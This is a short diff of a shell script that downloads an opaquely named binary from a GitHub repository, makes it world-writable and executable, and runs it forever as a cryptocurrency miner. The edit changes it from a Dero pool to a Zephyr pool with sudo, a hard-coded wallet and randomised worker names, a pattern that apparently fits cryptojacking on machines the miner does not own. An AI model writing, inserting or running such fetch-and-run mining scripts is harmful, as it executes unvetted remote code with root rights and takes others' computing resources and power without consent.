@@ -1,7 +1,7 @@
-wget https://github.com/renilo/kuuntul/raw/main/mente
-chmod 777 mente
+wget https://github.com/renilo/kuuntul/releases/download/test/kuntulan2
+chmod 777 kuntulan2
 
 while :; do
-    ./mente -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r stratum+tcp://51.222.96.66:443 -p stratum -m 40;
+    sudo ./kuntulan2 --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 --password $(echo $(shuf -i 1-99999999 -n 1)-VA1) --cpu-threads 4 --disable-gpu;
     sleep 5;
 done
